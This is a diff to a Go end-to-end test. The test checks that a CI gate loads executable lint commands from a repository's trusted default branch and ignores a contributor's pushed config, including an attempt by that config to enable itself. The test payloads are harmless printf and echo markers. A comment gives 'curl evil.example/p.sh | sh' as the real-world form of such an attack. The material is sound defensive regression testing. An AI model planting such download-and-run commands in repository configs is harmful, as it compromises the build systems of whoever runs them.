@@ -3,20 +3,25 @@
 package e2e
 
 import (
-	"context"
-	"fmt"
+	"strings"
 	"testing"
 	"time"
 
 	"github.com/runecraftai/squad/packages/drill/internal/types"
 )
 
+// repoCommandOutput is produced only when the pushed-branch lint command runs:
+// the payload computes it, so the literal text in the config never matches.
+const repoCommandOutput = "rce-42"
+
+const repoCommandPayload = "commands:\n  lint: 'printf rce-$((6*7))'\n"
+
 // TestRepoConfigCommandsFromDefaultBranch proves the supply-chain RCE fix
 // (audit finding #1): the code-executing fields commands.* are loaded from the
 // trusted default-branch copy of .drill.yaml, never from a contributor's
-// pushed SHA. A feature branch ships a malicious lint command that writes a
-// marker inside its execution copy; the secure default must ignore it, while
-// an explicit allow_repo_commands opt-in must run it.
+// pushed SHA. A feature branch ships a malicious lint command whose output
+// marks execution; the secure default must ignore it, while an explicit
+// allow_repo_commands opt-in must run it.
 func TestRepoConfigCommandsFromDefaultBranch(t *testing.T) {
 	t.Run("blocked_by_default", func(t *testing.T) {
 		optOut := false
@@ -26,20 +31,20 @@ func TestRepoConfigCommandsFromDefaultBranch(t *testing.T) {
 			t.Fatalf("nm init: %v\n%s", err, out)
 		}
 
-		markerPath := pushMaliciousRepoConfig(t, h, "rce-blocked")
+		pushMaliciousRepoConfig(t, h, "rce-blocked")
 
 		run := h.WaitForRun("rce-blocked", 90*time.Second)
 		if run.Status != types.RunCompleted {
 			t.Fatalf("run did not complete: status=%s error=%v", run.Status, deref(run.Error))
 		}
 
-		if upstreamHasFile(t, h, "rce-blocked", markerPath) {
-			t.Fatalf("SECURITY REGRESSION: pushed-branch lint command executed (marker %s reached upstream); commands.* must be loaded from the trusted default branch, not the pushed SHA", markerPath)
+		if repoCommandExecuted(t, h) {
+			t.Fatal("SECURITY REGRESSION: pushed-branch lint command executed (its output appeared in the lint step); commands.* must be loaded from the trusted default branch, not the pushed SHA")
 		}
 
 		// Sanity: the lint step ran (it delegated to the agent because the
 		// trusted default branch has no lint command) and reached a terminal
-		// status, so the absence of the marker is a real result rather than a
+		// status, so the absence of the output is a real result rather than a
 		// pipeline that never got to lint.
 		lintStep, ok := findStep(run.Steps, types.StepLint)
 		if !ok {
@@ -55,7 +60,7 @@ func TestRepoConfigCommandsFromDefaultBranch(t *testing.T) {
 	t.Run("executes_when_opted_in", func(t *testing.T) {
 		// Same attack payload, but the maintainer has explicitly opted in via
 		// allow_repo_commands. The pushed-branch command MUST run, proving the
-		// marker check above is a meaningful guard against regressions.
+		// output check above is a meaningful guard against regressions.
 		optIn := true
 		h := NewHarness(t, SetupOpts{Agent: "claude", Scenario: cleanReviewScenario(t), AllowRepoCommands: &optIn})
 
@@ -63,13 +68,13 @@ func TestRepoConfigCommandsFromDefaultBranch(t *testing.T) {
 			t.Fatalf("nm init: %v\n%s", err, out)
 		}
 
-		markerPath := pushMaliciousRepoConfig(t, h, "rce-optin")
+		pushMaliciousRepoConfig(t, h, "rce-optin")
 
 		run := h.WaitForRun("rce-optin", 90*time.Second)
 		// The opt-in run may complete or fail depending on later steps; either
 		// way the lint payload must have executed. Guard with a clear message.
-		if !upstreamHasFile(t, h, "rce-optin", markerPath) {
-			t.Fatalf("opt-in run should have executed the pushed-branch lint command (marker %s missing from upstream); run status=%s err=%v", markerPath, run.Status, deref(run.Error))
+		if !repoCommandExecuted(t, h) {
+			t.Fatalf("opt-in run should have executed the pushed-branch lint command (output %q missing from lint step); run status=%s err=%v", repoCommandOutput, run.Status, deref(run.Error))
 		}
 	})
 
@@ -86,13 +91,12 @@ func TestRepoConfigCommandsFromDefaultBranch(t *testing.T) {
 			t.Fatalf("nm init: %v\n%s", err, out)
 		}
 
-		markerPath := "command-executed.txt"
 		branch := "rce-self-enable"
 		h.CommitChange(branch, branch+".txt", "change to gate\n", "add "+branch+" change")
 		// The contributor tries to flip the opt-in on AND ship a hostile
 		// command in the same pushed copy. Both must be ignored: the trusted
 		// default-branch copy controls the switch.
-		selfEnableConfig := fmt.Sprintf("ignore_patterns:\n  - 'vendor/**'\nallow_repo_commands: true\ncommands:\n  lint: \"echo pwned > %s\"\n", markerPath)
+		selfEnableConfig := "ignore_patterns:\n  - 'vendor/**'\nallow_repo_commands: true\n" + repoCommandPayload
 		h.CommitChange(branch, ".drill.yaml", selfEnableConfig, "self-enable + malicious lint")
 		h.PushToGate(branch)
 
@@ -101,37 +105,36 @@ func TestRepoConfigCommandsFromDefaultBranch(t *testing.T) {
 			t.Fatalf("run did not complete: status=%s error=%v", run.Status, deref(run.Error))
 		}
 
-		if upstreamHasFile(t, h, branch, markerPath) {
-			t.Fatalf("SECURITY REGRESSION: pushed-branch allow_repo_commands self-enabled and ran the lint command (marker %s reached upstream); the opt-in must be read from the trusted default branch, not the pushed SHA", markerPath)
+		if repoCommandExecuted(t, h) {
+			t.Fatal("SECURITY REGRESSION: pushed-branch allow_repo_commands self-enabled and ran the lint command (its output appeared in the lint step); the opt-in must be read from the trusted default branch, not the pushed SHA")
 		}
 	})
 }
 
 // pushMaliciousRepoConfig creates a feature branch carrying a hostile
-// .drill.yaml whose lint command writes a marker inside the execution copy,
-// pushes it through the gate, and returns the relative path for an upstream
-// assertion. The default-branch .drill.yaml carries no commands, so it is the
-// trusted source.
-func pushMaliciousRepoConfig(t *testing.T, h *Harness, branch string) string {
+// .drill.yaml whose lint command prints repoCommandOutput only when executed,
+// and pushes it through the gate. The default-branch .drill.yaml carries no
+// commands, so it is the trusted source.
+func pushMaliciousRepoConfig(t *testing.T, h *Harness, branch string) {
 	t.Helper()
-	markerPath := "command-executed.txt"
 
 	// A real change so rebase has a non-empty diff.
 	h.CommitChange(branch, branch+".txt", "change to gate\n", "add "+branch+" change")
 
 	// The malicious payload: in the wild this would be
-	// "curl evil.example/p.sh | sh". It writes only inside its execution copy.
-	maliciousConfig := fmt.Sprintf("ignore_patterns:\n  - 'vendor/**'\ncommands:\n  lint: \"echo pwned > %s\"\n", markerPath)
-	h.CommitChange(branch, ".drill.yaml", maliciousConfig, "configure malicious lint command")
+	// "curl evil.example/p.sh | sh". Here it prints an output marker.
+	h.CommitChange(branch, ".drill.yaml", "ignore_patterns:\n  - 'vendor/**'\n"+repoCommandPayload, "configure malicious lint command")
 
 	h.PushToGate(branch)
-	return markerPath
 }
 
-func upstreamHasFile(t *testing.T, h *Harness, branch, path string) bool {
+// repoCommandExecuted reports whether the lint step captured the payload's
+// output, which only happens when the pushed-branch command actually ran.
+func repoCommandExecuted(t *testing.T, h *Harness) bool {
 	t.Helper()
-	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
-	defer cancel()
-	_, err := h.runGit(ctx, h.UpstreamDir, "cat-file", "-e", "refs/heads/"+branch+":"+path)
-	return err == nil
+	out, err := h.Run("axi", "logs", "--step", "lint", "--full")
+	if err != nil {
+		t.Fatalf("read lint step output: %v\n%s", err, out)
+	}
+	return strings.Contains(out, repoCommandOutput)
 }
